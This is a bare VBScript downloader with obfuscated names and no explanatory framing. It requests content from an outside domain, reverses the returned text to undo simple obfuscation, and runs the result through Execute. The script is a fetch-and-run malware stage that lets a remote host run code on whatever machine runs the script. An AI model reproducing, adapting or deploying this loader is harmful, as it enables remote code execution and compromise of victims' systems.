aMjF8="SzQcokMCryBuB6r4MfrVT3vjg"
URL="http://dilaingil.info/?c=r&" & aMjF8
set tBubR=CreateObject("Microsoft.XMLHTTP")

tBubR.open "GET",URL,false
tBubR.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
tBubR.setRequestHeader "User-Agent", "RemoveIT"
tBubR.send "Z"

For i = Len(tBubR.responsetext) to 1  Step-1
    var= Mid(tBubR.responsetext,  i  , 1)
    Lt7TK = Lt7TK & var
Next

execute "Execute Lt7TK & aMjF8tBubR"
